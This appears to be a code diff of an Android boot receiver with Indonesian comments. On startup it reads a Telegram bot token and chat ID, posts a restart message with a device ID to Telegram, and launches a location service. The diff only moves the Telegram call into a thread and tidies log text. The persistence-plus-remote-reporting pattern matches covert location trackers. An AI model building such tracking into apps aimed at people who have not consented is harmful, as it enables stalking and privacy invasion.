@@ -11,19 +11,12 @@ public class BootReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-
-
-
-
         if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
             SharedPreferences prefs = context.getSharedPreferences("config", Context.MODE_PRIVATE);
-
             String token = prefs.getString("bot_token", "");
             String chatId = prefs.getString("chat_id", "");
             String interval = prefs.getString("interval", "");
             String uid = prefs.getString("unique_id", "");
-
-
 
             boolean isValid = !token.isEmpty() && !chatId.isEmpty() && !interval.isEmpty() && !uid.isEmpty();
 
@@ -31,10 +24,13 @@ public class BootReceiver extends BroadcastReceiver {
                 Log.d("BootReceiver", "Boot completed, config valid. Starting LocationService...");
 
                 // Kirim notifikasi ke Telegram
-                String message = "✅ Perangkat menyala ulang\nID: " + uid + "\nService akan dimulai.";
-                TelegramHelper telegram = new TelegramHelper(context);
-                telegram.sendMessage(token, chatId, message);
-                // Mulai LocationService
+                new Thread(() -> {
+                    TelegramHelper telegram = new TelegramHelper(context);
+                    String message = "✅ Perangkat menyala ulang\nID: " + uid + "\nService akan dimulai.";
+                    telegram.sendMessage(token, chatId, message);
+                }).start();
+
+                // Mulai service
                 Intent serviceIntent = new Intent(context, LocationService.class);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     context.startForegroundService(serviceIntent);
@@ -42,7 +38,7 @@ public class BootReceiver extends BroadcastReceiver {
                     context.startService(serviceIntent);
                 }
             } else {
-                Log.d("BootReceiver", "Boot completed, config tidak lengkap. Service tidak dijalankan.");
+                Log.d("BootReceiver", "Config tidak lengkap, service tidak dijalankan.");
             }
         }
     }
